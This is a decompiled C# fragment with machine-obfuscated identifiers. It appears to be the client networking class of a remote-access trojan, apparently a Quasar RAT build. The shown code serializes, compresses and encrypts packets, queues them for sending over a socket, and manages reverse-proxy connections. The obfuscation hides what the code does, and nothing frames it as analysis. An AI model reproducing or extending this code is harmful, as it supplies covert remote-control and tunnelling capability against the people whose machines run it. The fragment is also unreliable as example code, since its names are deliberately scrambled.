              this.쥿餏얝ṻ\u2A16\u27D9\uFFFD똳瘍캒倣\u25B9꼘ꡧ婦揲㒎큱\u2EC8畯 = 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.珞港ꦽ\u0A57瘫㷺蠙㮈뒶艵讁\u283A\u252E\u2AA3矶\uEF75㔿\uA4B6얗黴.\u064E쑏\uFFFD㨃楃解襒㷧퇂\u248C獠㫜\u257F\uE561쳛灳뉼䘽䠭\u3391;
              this.퍉㦡\u20AD䋦㶱\u1FDFค夑\uED2Cᜮ\uEC61쐍뷥膷彆䈢\uEF57个靄淯 = (byte[]) null;
              this.\uFAFEԲ烧\uA4A7鵉ｅ鵉膞먁羃ᯋ\uFFFD\uF58B偞睊ꮼहᰓ쀤䠕 = 0;
              this.쀙挔磀巺㦋湅鼪ଋ夕\u29BE踳\u255F箈ӳ\uE3EB轢\uFFFD촿쐢\u2749 = 0;
            }
            if (this.䚁콂滛棺Ꮊ擝ꊶ垩ⶔ\u2FB7䦛㱦蔫ﹺ貼쨇\u20A3齾氛뚕 == 0)
            {
              flag1 = false;
              continue;
            }
            continue;
          default:
            continue;
        }
      }
      if (this.쥿餏얝ṻ\u2A16\u27D9\uFFFD똳瘍캒倣\u25B9꼘ꡧ婦揲㒎큱\u2EC8畯 == 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.珞港ꦽ\u0A57瘫㷺蠙㮈뒶艵讁\u283A\u252E\u2AA3矶\uEF75㔿\uA4B6얗黴.\u064E쑏\uFFFD㨃楃解襒㷧퇂\u248C獠㫜\u257F\uE561쳛灳뉼䘽䠭\u3391)
        this.쀙挔磀巺㦋湅鼪ଋ夕\u29BE踳\u255F箈ӳ\uE3EB轢\uFFFD촿쐢\u2749 = 0;
      this.\uFFFD鳒쒪\u1CAF쨣掋\u2732냨泶\uFFFD涆綩᪑惂뺋\u2668\uFFFD箎摂毙 = 0;
      this.䚁콂滛棺Ꮊ擝ꊶ垩ⶔ\u2FB7䦛㱦蔫ﹺ貼쨇\u20A3齾氛뚕 = 0;
    }
  }

  public void 蓀쉺\uEA20ಲ꘩\u300E\uE378鞞떒뾈㮈튆㨠鳧풭礜\uEC0B赑놇灹<T>(T packet) where T : 쾭匟卥쌆\uFFFD읂蘾\u3222Ｌ耈\u2D73ウ\uE00C늣飻皨ߖ빕衆뤽
  {
    try
    {
      if (!this.Connected || (object) packet == null)
        return;
      lock (this.\uFFFD䋩鰬쥕뷺䫽쥄㐖\uE893\uEE69懐ﹿ\u32C2ⳗ껕\u33F9\uEDFB뢮匴諾)
      {
        using (MemoryStream memoryStream = new MemoryStream())
        {
          try
          {
            this.Serializer.Serialize((Stream) memoryStream, (object) packet);
          }
          catch (Exception ex)
          {
            this.죌\uE33D酉㿵虀\u32D1ရ\u227F떨맺躅\uEE14ﭓﭐ肄篏㧟\uEDDB笫\uE04C(ex);
            return;
          }
          byte[] array = memoryStream.ToArray();
          this.\uFFFD䋩鰬쥕뷺䫽쥄㐖\uE893\uEE69懐ﹿ\u32C2ⳗ껕\u33F9\uEDFB뢮匴諾.Enqueue(array);
          this.쐖錦䤩厔\uFFFD\uF456\u21CF跊\uFFFD跷쬁圹Ԍ\uFFFD쌢㝮跗쵨鴲균((쾭匟卥쌆\uFFFD읂蘾\u3222Ｌ耈\u2D73ウ\uE00C늣飻皨ߖ빕衆뤽) packet, (long) array.Length, array);
          lock (this.翝纃Җ\u082F\uEA46鎜赟ᩗ\uE629\u1AAB怡鬱ౌ翏㰁嬛\uFFFD\uFFEE㠙ꖱ)
          {
            if (this.좯疒玛\uF53B\u2789䭘\uF3CB\u2231\uFFFD魬䂅莻掾깉뀶샻䕓ḯ\u299C紐)
              return;
            this.좯疒玛\uF53B\u2789䭘\uF3CB\u2231\uFFFD魬䂅莻掾깉뀶샻䕓ḯ\u299C紐 = true;
          }
          ThreadPool.QueueUserWorkItem(new WaitCallback(this.撘\u2BB2ꋱ祉蠆䘄\uE4FC\uF603쎅䶢\uFFFDꤴ\uFFFD\uF8D6\uFFFD퐹㖤ﰖ\uEA3D㗒));
        }
      }
    }
    catch (Exception ex)
    {
    }
  }

  public void ﺭ션뼣푛\uFFFD鳁扈\uFE3C២馦ტ黋㞱콒ᭂ쁹긹䤟冣뉆<T>(T packet) where T : 쾭匟卥쌆\uFFFD읂蘾\u3222Ｌ耈\u2D73ウ\uE00C늣飻皨ߖ빕衆뤽
  {
    try
    {
      this.蓀쉺\uEA20ಲ꘩\u300E\uE378鞞떒뾈㮈튆㨠鳧풭礜\uEC0B赑놇灹<T>(packet);
      while (this.좯疒玛\uF53B\u2789䭘\uF3CB\u2231\uFFFD魬䂅莻掾깉뀶샻䕓ḯ\u299C紐)
        Thread.Sleep(10);
    }
    catch (Exception ex)
    {
    }
  }

  private void 撘\u2BB2ꋱ祉蠆䘄\uE4FC\uF603쎅䶢\uFFFDꤴ\uFFFD\uF8D6\uFFFD퐹㖤ﰖ\uEA3D㗒(object state)
  {
    while (this.Connected)
    {
      byte[] payload;
      lock (this.\uFFFD䋩鰬쥕뷺䫽쥄㐖\uE893\uEE69懐ﹿ\u32C2ⳗ껕\u33F9\uEDFB뢮匴諾)
      {
        if (this.\uFFFD䋩鰬쥕뷺䫽쥄㐖\uE893\uEE69懐ﹿ\u32C2ⳗ껕\u33F9\uEDFB뢮匴諾.Count == 0)
        {
          this.䩏䶞\u22D2폞䞡畻ꩫ\uFFFD㼵敐ᤚ\uE2BA諹\uEF4C隿繴殇뾔䠨좖();
          return;
        }
        payload = this.\uFFFD䋩鰬쥕뷺䫽쥄㐖\uE893\uEE69懐ﹿ\u32C2ⳗ껕\u33F9\uEDFB뢮匴諾.Dequeue();
      }
      try
      {
        this.婘홢\uFDEE겠䔝巌졷玿먽靫ꝝ弪ᅙ逡\u2872\u22CD왑ͽ棷Ϝ.Send(this.늍꿆냮ᑑ芐突⃓ヅ讣ᒽ䕙큂釞쯺甆ᢋ촕ᢄ撣\uF322(payload));
      }
      catch (Exception ex)
      {
        this.죌\uE33D酉㿵虀\u32D1ရ\u227F떨맺躅\uEE14ﭓﭐ肄篏㧟\uEDDB笫\uE04C(ex);
        this.䩏䶞\u22D2폞䞡畻ꩫ\uFFFD㼵敐ᤚ\uE2BA諹\uEF4C隿繴殇뾔䠨좖(true);
        return;
      }
    }
    this.䩏䶞\u22D2폞䞡畻ꩫ\uFFFD㼵敐ᤚ\uE2BA諹\uEF4C隿繴殇뾔䠨좖(true);
  }

  private byte[] 늍꿆냮ᑑ芐突⃓ヅ讣ᒽ䕙큂釞쯺甆ᢋ촕ᢄ撣\uF322(byte[] payload)
  {
    try
    {
      payload = 싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.浆鉱V蘄Ⰴ\u291Fઁ\u339Cᮼ滝ኗ偯鞀仢汢晼혀䙬\u0861퇀(payload);
      payload = 湝增ﭞ嵇ʧ\uF2CD\uFFFD뜚罡ꈱ\u2B63\u2011퐖珎\u1CAD胂\uEF70ต댩\uEB37.\u2D72\uD7FF塻颿ጚﬄᕌ쯮\uAA4F鞞\uF6CDꦪ뺩玼ሱ쁔爢좨辷\uE3C0(payload);
      byte[] destinationArray = new byte[payload.Length + this.HEADER_SIZE];
      Array.Copy((Array) BitConverter.GetBytes(payload.Length), (Array) destinationArray, this.HEADER_SIZE);
      Array.Copy((Array) payload, 0, (Array) destinationArray, this.HEADER_SIZE, payload.Length);
      return destinationArray;
    }
    catch (Exception ex)
    {
    }
    return (byte[]) null;
  }

  private void 䩏䶞\u22D2폞䞡畻ꩫ\uFFFD㼵敐ᤚ\uE2BA諹\uEF4C隿繴殇뾔䠨좖(bool clear = false)
  {
    try
    {
      lock (this.翝纃Җ\u082F\uEA46鎜赟ᩗ\uE629\u1AAB怡鬱ౌ翏㰁嬛\uFFFD\uFFEE㠙ꖱ)
        this.좯疒玛\uF53B\u2789䭘\uF3CB\u2231\uFFFD魬䂅莻掾깉뀶샻䕓ḯ\u299C紐 = false;
      if (!clear)
        return;
      lock (this.\uFFFD䋩鰬쥕뷺䫽쥄㐖\uE893\uEE69懐ﹿ\u32C2ⳗ껕\u33F9\uEDFB뢮匴諾)
        this.\uFFFD䋩鰬쥕뷺䫽쥄㐖\uE893\uEE69懐ﹿ\u32C2ⳗ껕\u33F9\uEDFB뢮匴諾.Clear();
    }
    catch (Exception ex)
    {
    }
  }

  public void \u0607碧\uFFFDꓞ䣉թ쟟蜳쁎䜗쿿뀭僷傈䠁\u21FFⷛ钝⃗䒴()
  {
    try
    {
      if (this.婘홢\uFDEE겠䔝巌졷玿먽靫ꝝ弪ᅙ逡\u2872\u22CD왑ͽ棷Ϝ != null)
      {
        this.婘홢\uFDEE겠䔝巌졷玿먽靫ꝝ弪ᅙ逡\u2872\u22CD왑ͽ棷Ϝ.Close();
        this.婘홢\uFDEE겠䔝巌졷玿먽靫ꝝ弪ᅙ逡\u2872\u22CD왑ͽ棷Ϝ = (Socket) null;
        this.\uFFFD鳒쒪\u1CAF쨣掋\u2732냨泶\uFFFD涆綩᪑惂뺋\u2668\uFFFD箎摂毙 = 0;
        this.쀙挔磀巺㦋湅鼪ଋ夕\u29BE踳\u255F箈ӳ\uE3EB轢\uFFFD촿쐢\u2749 = 0;
        this.ዋ\uF1CC蟊擟㞏홛粥腭媻ꥬ\uFFFD廽굷澧땵嶽匞獭늄䙻 = 0;
        this.䚁콂滛棺Ꮊ擝ꊶ垩ⶔ\u2FB7䦛㱦蔫ﹺ貼쨇\u20A3齾氛뚕 = 0;
        this.\uFAFEԲ烧\uA4A7鵉ｅ鵉膞먁羃ᯋ\uFFFD\uF58B偞睊ꮼहᰓ쀤䠕 = 0;
        this.퍉㦡\u20AD䋦㶱\u1FDFค夑\uED2Cᜮ\uEC61쐍뷥膷彆䈢\uEF57个靄淯 = (byte[]) null;
        this.쥿餏얝ṻ\u2A16\u27D9\uFFFD똳瘍캒倣\u25B9꼘ꡧ婦揲㒎큱\u2EC8畯 = 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.珞港ꦽ\u0A57瘫㷺蠙㮈뒶艵讁\u283A\u252E\u2AA3矶\uEF75㔿\uA4B6얗黴.\u064E쑏\uFFFD㨃楃解襒㷧퇂\u248C獠㫜\u257F\uE561쳛灳뉼䘽䠭\u3391;
        if (this.\uF5A3\u27B2\uFFFD䪈䢖꽁罻ښ莉밈廰眩籠鞿룜㗫\uE748ꁱ\uF201Ꭳ != null)
        {
          lock (this.䥒蝠ᤊ鼗\uFFFD䶠瓘￹\u3246\u2975\u3012볥뺥鯃\uF067쀿䄗鄀䖞ⷠ)
          {
            try
            {
              foreach (\uEBF9\u2BE9Ⴒ鮡䈄\uED9B퉥䑎꼬春쒦諺똻ﻤ\u28D5償\uEED7\uFFFD홙\uFFFD ⴒ鮡䈄퉥䑎꼬春쒦諺똻ﻤ償홙 in this.\uF5A3\u27B2\uFFFD䪈䢖꽁罻ښ莉밈廰眩籠鞿룜㗫\uE748ꁱ\uF201Ꭳ)
                ⴒ鮡䈄퉥䑎꼬春쒦諺똻ﻤ償홙.䆅㝻쟍\uFFFDో̯쐞\uA494囒믒檮\uF333軏疭ͼᣨ\u2446\uE7C8\uEF9E㺾();
            }
            catch (Exception ex)
            {
            }
          }
        }
        if (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4 != null)
        {
          \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4.Dispose();
          \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.ᶯ듺\uE73C\uFFFD\uA957ᐥ避Ⳁ紧ᰈ㤁\uFFFD\uE796୪丬梗쎺쓩㮺\u31D4 = (UnsafeStreamCodec) null;
        }
      }
      this.湦筇圔\uFD41掴嬧죮ꨫ胛\uE08C鯝\uE46Cଽ갧毫७ᣳ\u221E\uEBAF\uE225(false);
    }
    catch (Exception ex)
    {
    }
  }

  public void 㱬턌烒㗑㴵銠䓠\uFFFD௨迟螴ꭕቖ희앪Ṕ翻ꚥ롦\uE24A(ReverseProxyConnect command)
  {
    lock (this.䥒蝠ᤊ鼗\uFFFD䶠瓘￹\u3246\u2975\u3012볥뺥鯃\uF067쀿䄗鄀䖞ⷠ)
      this.\uF5A3\u27B2\uFFFD䪈䢖꽁罻ښ莉밈廰眩籠鞿룜㗫\uE748ꁱ\uF201Ꭳ.Add(new \uEBF9\u2BE9Ⴒ鮡䈄\uED9B퉥䑎꼬春쒦諺똻ﻤ\u28D5償\uEED7\uFFFD홙\uFFFD(command, this));
  }

  public \uEBF9\u2BE9Ⴒ鮡䈄\uED9B퉥䑎꼬春쒦諺똻ﻤ\u28D5償\uEED7\uFFFD홙\uFFFD 뷐Ⰻ缣맧눗뉱뭖ﴵ鮼\u24AD幧阍蠭\uF32D\uFFFD凞쿤櫕躰\uE8D6(
    int connectionId)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.꽃\uE5E9\u3355ꅩ簂峒ﵓ䘽뜈믱樓\uE8EB咝ꌽ\uE10E荠橸\u27D5聜馷 꽃ꅩ簂峒ﵓ䘽뜈믱樓咝ꌽ荠橸聜馷 = new 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.꽃\uE5E9\u3355ꅩ簂峒ﵓ䘽뜈믱樓\uE8EB咝ꌽ\uE10E荠橸\u27D5聜馷();
    // ISSUE: reference to a compiler-generated field
    꽃ꅩ簂峒ﵓ䘽뜈믱樓咝ꌽ荠橸聜馷.\uF024넴믁豪ℚྛ㓡鉄첤ꗾဒῲ殙\uF8EFࣺ鋚\uF0A4誧궪없 = connectionId;
    lock (this.䥒蝠ᤊ鼗\uFFFD䶠瓘￹\u3246\u2975\u3012볥뺥鯃\uF067쀿䄗鄀䖞ⷠ)
    {
      // ISSUE: reference to a compiler-generated method
      return this.\uF5A3\u27B2\uFFFD䪈䢖꽁罻ښ莉밈廰眩籠鞿룜㗫\uE748ꁱ\uF201Ꭳ.FirstOrDefault<\uEBF9\u2BE9Ⴒ鮡䈄\uED9B퉥䑎꼬春쒦諺똻ﻤ\u28D5償\uEED7\uFFFD홙\uFFFD>(new Func<\uEBF9\u2BE9Ⴒ鮡䈄\uED9B퉥䑎꼬春쒦諺똻ﻤ\u28D5償\uEED7\uFFFD홙\uFFFD, bool>(꽃ꅩ簂峒ﵓ䘽뜈믱樓咝ꌽ荠橸聜馷.轏它\u27D3禊鋈\uE1D6鵌\u2E35誚筩痻狐꣘푸乘漧ﳼ斢\u23A6垒));
    }
  }

  public void 泿㙵\u2EF6賓\uA4B5髖ꀃ篝쥧虽溚퓁ᢘ颷\u2683籣ꎴ驡烙뺠(int connectionId)
  {
    try
    {
      lock (this.䥒蝠ᤊ鼗\uFFFD䶠瓘￹\u3246\u2975\u3012볥뺥鯃\uF067쀿䄗鄀䖞ⷠ)
      {
        for (int index = 0; index < this.\uF5A3\u27B2\uFFFD䪈䢖꽁罻ښ莉밈廰眩籠鞿룜㗫\uE748ꁱ\uF201Ꭳ.Count; ++index)
        {
          if (this.\uF5A3\u27B2\uFFFD䪈䢖꽁罻ښ莉밈廰眩籠鞿룜㗫\uE748ꁱ\uF201Ꭳ[index].ConnectionId == connectionId)
          {
            this.\uF5A3\u27B2\uFFFD䪈䢖꽁罻ښ莉밈廰眩籠鞿룜㗫\uE748ꁱ\uF201Ꭳ.RemoveAt(index);
            break;
          }
        }
      }
    }
    catch (Exception ex)
    {
    }
  }

  public delegate void 즣噟엕\u2385ꐩ쐦\u243F䭁餒\u087E㹑ధꄨ놛苕묐읛\uFFFDພ獮(
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ s,
    Exception ex);

  public delegate void 坊緸ᔢꌙ६ﲳ㲪疡軀앓쯴賮塙텆ᩜ\uE00D셚羞鮔륌(
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ s,
    bool connected);

  public delegate void \u1DF1駲\uF0AE᳦\uF2AF胿\u23F3뺂妞䣜诲ಆ\uF47Dૢ읹䞮돍ᩎ㡦삧(
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ s,
    쾭匟卥쌆\uFFFD읂蘾\u3222Ｌ耈\u2D73ウ\uE00C늣飻皨ߖ빕衆뤽 packet);

  public delegate void 讗\uEA31풚\uF59B鉋鰴ꑣ硇鎑ꤒ軖꽋婱ٳ췕姿这셋둞퇸(
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ s,
    쾭匟卥쌆\uFFFD읂蘾\u3222Ｌ耈\u2D73ウ\uE00C늣飻皨ߖ빕衆뤽 packet,
    long length,
    byte[] rawData);

  public enum 珞港ꦽ\u0A57瘫㷺蠙㮈뒶艵讁\u283A\u252E\u2AA3矶\uEF75㔿\uA4B6얗黴
  {
    \u064E쑏\uFFFD㨃楃解襒㷧퇂\u248C獠㫜\u257F\uE561쳛灳뉼䘽䠭\u3391,
    \uE76F懑ᛒ\uF491渏얕ᷩ孒㨄晬Ꮩ訴\uFFFD\uE260ꍑꖆه큄㖜囘,
  }
}
